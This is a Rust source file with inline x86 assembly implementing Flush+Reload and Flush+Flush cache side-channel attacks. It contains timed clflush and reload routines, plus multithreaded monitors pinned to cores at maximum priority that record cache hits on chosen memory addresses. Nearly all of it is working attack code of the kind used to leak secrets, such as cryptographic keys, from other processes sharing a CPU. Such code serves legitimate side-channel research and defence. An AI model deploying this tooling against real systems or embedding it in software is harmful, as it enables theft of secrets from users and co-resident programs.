
use rand::prelude::*;
use std::thread;
use std::cmp;
use thread_priority::*;
use std::sync::{Arc, Barrier};
use super::attack::*;

// macro_rules! mycat {
//     ($($line: expr)+,)  =>   (           
//             concat!(
//                 $(
//                     concat!("\n\t", $line), 
//                 )+
//             )
//     )
// }

#[inline]
fn nanosleep(ts: &libc::timespec) {
    unsafe {
        libc::nanosleep(ts as *const libc::timespec, 0 as *mut libc::timespec);
    }
}

macro_rules! clflush {
    ($addr: expr)    =>   (
        unsafe {
            asm!(
                concat!(
                    "\n\tlfence\n\t",
                    "\n\tclflush  ($0)",
                    "\n\tcpuid",
                    "\n\tmfence\n\t"
                )
                :
                :  "r" ($addr)
                : "rax", "rbx", "rcx", "rdx"
                : "volatile" 
            )
        }
    )
}

#[inline]
pub fn rdtscp() -> u64 {
    let a : u64;
    let d : u64;
    unsafe {

        asm!(
            "rdtscp\n\t"
            : "={rdx}" (d), "={rax}"(a)
            :
            : "rcx"
            : "volatile"
        );
        (d<<32) | a
    }
}

#[inline]
fn rdtscp_core(core: &mut u64) -> u64 {
    let a : u64;
    let d : u64;
    let c : u64;
    unsafe {

        asm!(
            "rdtscp\n\t"
            : "={rdx}" (d), "={rax}"(a), "={rcx}"(*core)
            :
            : 
            : "volatile"
        );
        (d<<32) | a
    }
}


#[inline]
pub fn mem_access(p: &u64) {
    unsafe {
        asm!(
             concat!(
                // "\n\tlfence\n\t",
                "movq ($0), %rax\n\t",
                // "\n\tcpuid",
                // "\n\tmfence\n\t"
            )
            :
            : "r" (p)
            : "rax" /*, "rbx", "rcx", "rdx"*/
            : "volatile"
        )
    }
}

#[inline]
pub fn flush(p: &u64) {
    clflush!(p as *const u64);
}


#[inline]
pub fn reload_flush(addr: *const u8, time_stamp: &mut u64, delta: &mut u64) {
    unsafe {
        asm!(
            concat!(
                // "\n\tmfence",
                "\n\tlfence",
                "\n\trdtscp",
                "\n\tshl $$32, %rdx",
                "\n\tor  %rdx, %rax",
                "\n\tmov %rax, %rsi",
                "\n\tmovq (%rbx), %rax",
                "\n\tlfence",
                "\n\trdtscp",
                "\n\tshl $$32, %rdx",
                "\n\tor  %rdx, %rax",
                "\n\tmov %rax, %rdx",
                "\n\tsub %rsi, %rax",
                "\n\tclflush 0(%rbx)",
                "\n\tmfence",
                "\n\tclflush 0(%rbx)",
                "\n\tmfence",
                // "\n\tclflush 4(%rbx)",
                // "\n\tclflush  64(%rbx)",
            )
            : "={rax}" (*delta), "={rdx}"(*time_stamp)   /* Outputs $1 = time_stamp */
            : "{rbx}" (addr)           /* Inputs: $2 = addr */
            : "rsi", "rcx"      /* Clobbers */
            : "volatile"           /* Options  */
        );
    }
}

#[inline]
pub fn time_clflush(addr: *const u8, ts: &mut u64, delta: &mut u64) {
    unsafe {
        asm!(
            concat!(
                "\n\tmfence",
                "\n\trdtscp",
                "\n\tlfence",
                "\n\tshl $$32, %rdx",
                "\n\tor  %rdx, %rax",
                "\n\tmov %rax, %rsi",
                "\n\tclflush  (%rbx)",
                "\n\tmfence",
                "\n\tclflush  (%rbx)",
                "\n\tmfence",
                "\n\tclflush  4(%rbx)",
                "\n\tcpuid",
                "\n\tlfence",
                "\n\trdtscp",
                "\n\tlfence",
                "\n\tshl $$32, %rdx",
                "\n\tor  %rdx, %rax",
                "\n\tmov %rax, %rdx",
                "\n\tsub %rsi, %rax",
                
            )
            : "={rax}" (*delta) , "={rdx}"(*ts)     /* Outputs $1 = time_stamp */
            : "{rbx}" (addr)           /* Inputs: $2 = addr */
            : "rsi", "rcx"         /* Clobbers */
            : "volatile"           /* Options  */
        );
    }
}


pub struct Monitor {
    pub addr: *const u8,
    pub hit_ts: Vec<u64>,
}

unsafe impl std::marker::Send for Monitor {}


#[inline]
pub fn tsc_wait(delta: u64) {
    let end_tsc = rdtscp() + delta;
    wait_until(end_tsc);
}

#[inline]
pub fn wait_until(end_tsc: u64) {
    while rdtscp() < end_tsc {
        unsafe {
            asm!("nop":::: "volatile");
        }
    }
}

pub fn run_thread(barrier: Arc<Barrier>, fire_tsc: u64, mut mon: Monitor, attack: Attack, threshold:u64, timeout: u64) -> Monitor {
    let mut ts: u64 = 0;
    let mut delta: u64 = 0;
    // let max_samples = mon.hit_ts.capacity() - 1;
    let addr = mon.addr;
    let mut end_tsc = fire_tsc + timeout;

    // clflush!(addr);




    match attack {

        Attack::FlushReload => {
            eprintln!("starting Flush+Reload with threshold={}", threshold);
            // let p = v.as_mut_ptr();
            barrier.wait();
            wait_until(fire_tsc);
            loop {
                reload_flush(addr, &mut ts, &mut delta);
                if delta < threshold {
                    end_tsc = ts + timeout;
                    mon.hit_ts.push(ts);
                }
                else {
                    if ts > end_tsc {
                        return mon;
                    }
                }
                tsc_wait(1000);
            }
    // unsafe {
    //     ptr::write(p.offset(i), ts);
    // }
        }
        Attack::FlushFlush => {
            eprintln!("starting Flush+Flush with threshold={}", threshold);
            barrier.wait();
            wait_until(fire_tsc);
            loop {
                time_clflush(addr, &mut ts, &mut delta);
                if delta >= threshold && delta < 500 {
        
                    end_tsc = ts + timeout;
                    mon.hit_ts.push(ts);
                }
                else {
                    if ts > end_tsc {
                        return mon;
                    }
                }
                tsc_wait(1000);
            }
        }
        
    }


    eprintln!("end of run_thread {}", mon.hit_ts.len());

    mon
}



pub fn run_attack(monitors:&mut  Vec<Monitor>, attack: Attack, threshold: u64, timeout: u64) {


    // let mut rng = thread_rng();

    // let sleep_timespec = libc::timespec {
    //     tv_sec: (useconds / 1000000),
    //     tv_nsec: (useconds % 1000000) * 1000,
    // };

    for m in monitors.iter() {
        clflush!(m.addr);
    }


    let allowed_core_ids = core_affinity::get_core_ids().unwrap();

    let mut handles = Vec::new();

    let now = rdtscp();

    let barrier = Arc::new(Barrier::new(monitors.len()));
    let fire_time = now + 2300 * 1000; // TODO 
    
    for (idx, mon) in monitors.drain(..).enumerate() {
        let id = allowed_core_ids[idx % allowed_core_ids.len()];

        let attack_clone = attack.clone();
        let barrier_cloned = barrier.clone();
        let handle = thread::spawn(move || {
            core_affinity::set_for_current(id);
            set_thread_priority(
                thread_native_id(),
                ThreadPriority::Max,
                ThreadSchedulePolicy::Normal (NormalThreadSchedulePolicy::Normal)
            ).unwrap();
            run_thread(barrier_cloned, fire_time, mon, attack_clone, threshold, timeout)
        });
        handles.push(handle);
    }

    for handle in handles.into_iter() {
        monitors.push(handle.join().unwrap());
    }
}